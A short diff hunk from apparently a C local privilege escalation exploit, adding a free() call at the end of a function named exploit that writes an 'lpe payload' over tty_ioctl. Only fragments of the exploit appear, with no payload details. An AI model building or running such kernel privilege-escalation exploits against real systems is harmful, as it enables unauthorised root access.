@@ -87,6 +87,8 @@ void exploit(int fd)
   
   printf("[+] Overwriting tty_ioctl with lpe payload\n");
   write(fd, b, PAGE_SIZE);
+  
+  free(b);
 }
 
 
